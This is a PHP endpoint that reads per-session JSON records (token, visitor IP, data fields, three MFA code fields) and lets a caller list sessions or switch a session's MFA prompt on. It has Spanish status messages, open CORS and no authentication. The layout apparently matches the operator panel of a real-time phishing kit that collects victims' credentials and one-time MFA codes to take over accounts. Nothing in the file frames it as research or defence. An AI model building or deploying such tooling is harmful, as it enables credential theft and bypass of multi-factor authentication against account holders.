<?php

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET');
header('Access-Control-Allow-Headers: Content-Type');

$logFile = './change_log.json';

function logChange($token) {
    global $logFile;
    $logData = [];
    if (file_exists($logFile)) {
        $logContent = file_get_contents($logFile);
        $logData = json_decode($logContent, true) ?? [];
    }
    $logData[$token] = [
        'timestamp' => time()
    ];
    file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT));
}

$track = filter_input(INPUT_GET, 'track', FILTER_SANITIZE_SPECIAL_CHARS);

if ($track === '!') {
    $jsonFiles = glob('../files/*.json');

    if (empty($jsonFiles)) {
        echo json_encode(['error' => 'No JSON files found.'], JSON_PRETTY_PRINT);
        exit;
    }

    // Retrieve file modification times
    $filesWithTimes = [];
    foreach ($jsonFiles as $file) {
        $filesWithTimes[$file] = filemtime($file);
    }

    // Sort files by modification time, descending
    arsort($filesWithTimes);

    $response = [
        'premfa' => [],
        'mfa' => []
    ];

    $logData = [];
    if (file_exists($logFile)) {
        $logContent = file_get_contents($logFile);
        $logData = json_decode($logContent, true) ?? [];
    }

    foreach ($filesWithTimes as $file => $mtime) {
        $content = @file_get_contents($file);
        if ($content === false) {
            continue;
        }
        $data = json_decode($content, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            continue;
        }

        if (isset($data['mfastatus']) && $data['mfastatus'] === 'on') {
            $filenameWithoutExtension = pathinfo($file, PATHINFO_FILENAME);

            if (isset($data['status'])) {
                if ($data['status'] === 'mfa') {
                    array_unshift($response['mfa'], $filenameWithoutExtension);
                } else {
                    array_unshift($response['premfa'], $filenameWithoutExtension);
                }
            }

            logChange($data['token']);
        }
    }

    $response['premfa'] = array_reverse($response['premfa']);
    $response['mfa'] = array_reverse($response['mfa']);

    echo json_encode($response, JSON_PRETTY_PRINT);
    exit;
}

$tokenToSearch = filter_input(INPUT_GET, 'token', FILTER_SANITIZE_SPECIAL_CHARS);

if ($tokenToSearch === null || $tokenToSearch === false || $tokenToSearch === '') {
    echo json_encode([
        'error' => 'El parámetro "token" es requerido y no puede estar vacío.'
    ], JSON_PRETTY_PRINT);
    exit;
}

$jsonFiles = glob('../files/*.json');

if (empty($jsonFiles)) {
    echo json_encode(['error' => 'No JSON files found.'], JSON_PRETTY_PRINT);
    exit;
}

$response = [];
$tokenFound = false;

foreach ($jsonFiles as $file) {
    $content = @file_get_contents($file);
    if ($content === false) {
        continue;
    }
    $data = json_decode($content, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        continue;
    }
    if (isset($data['token']) && $data['token'] === $tokenToSearch) {
        $tokenFound = true;
        if (isset($data['mfastatus']) && $data['mfastatus'] === 'off') {
            $data['mfastatus'] = 'on';
            $updatedContent = json_encode($data, JSON_PRETTY_PRINT);
            if (@file_put_contents($file, $updatedContent) === false) {
                $response = [
                    'error' => 'error',
                    'token' => $data['token'],
                    'mfastatus' => $data['mfastatus'],
                    'ip' => $data['ip'] ?? '',
                    'data1' => $data['data1'] ?? null,
                    'data2' => $data['data2'] ?? null,
                    'data3' => $data['data3'] ?? null,
                    'mfa1' => $data['mfa1'] ?? '',
                    'mfa2' => $data['mfa2'] ?? '',
                    'mfa3' => $data['mfa3'] ?? ''
                ];
            } else {
                $response = [
                    'success' => 'MFA Activado on.',
                    'token' => $data['token'],
                    'mfastatus' => $data['mfastatus'],
                    'ip' => $data['ip'] ?? '',
                    'data1' => $data['data1'] ?? null,
                    'data2' => $data['data2'] ?? null,
                    'data3' => $data['data3'] ?? null,
                    'mfa1' => $data['mfa1'] ?? '',
                    'mfa2' => $data['mfa2'] ?? '',
                    'mfa3' => $data['mfa3'] ?? ''
                ];
                logChange($data['token']);
            }
        } else {
            $response = [
                'info' => 'MFA ready!.',
                'token' => $data['token'],
                'mfastatus' => $data['mfastatus'] ?? '',
                'ip' => $data['ip'] ?? '',
                'data1' => $data['data1'] ?? null,
                'data2' => $data['data2'] ?? null,
                'data3' => $data['data3'] ?? null,
                'mfa1' => $data['mfa1'] ?? '',
                'mfa2' => $data['mfa2'] ?? '',
                'mfa3' => $data['mfa3'] ?? ''
            ];
        }
        break;
    }
}

if (!$tokenFound) {
    $response = [
        'error' => 'Token no encontrado.'
    ];
}

echo json_encode($response, JSON_PRETTY_PRINT);

?>

